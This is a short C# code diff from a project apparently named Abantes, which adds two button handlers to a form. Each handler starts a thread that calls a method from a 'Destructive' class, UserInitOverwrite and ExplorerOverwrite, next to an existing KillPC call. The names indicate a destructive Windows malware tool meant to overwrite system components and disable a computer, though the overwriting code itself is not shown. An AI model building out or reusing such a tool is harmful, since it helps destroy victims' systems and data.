@@ -124,5 +124,17 @@ namespace Abantes
             Thread KPC = new Thread(new ThreadStart(Destructive.KillPC));
             KPC.Start();
         }
+
+        private void button16_Click(object sender, EventArgs e)
+        {
+            Thread UIO = new Thread(new ThreadStart(Destructive.UserInitOverwrite));
+            UIO.Start();
+        }
+
+        private void button17_Click(object sender, EventArgs e)
+        {
+            Thread EO = new Thread(new ThreadStart(Destructive.ExplorerOverwrite));
+            EO.Start();
+        }
     }
 }
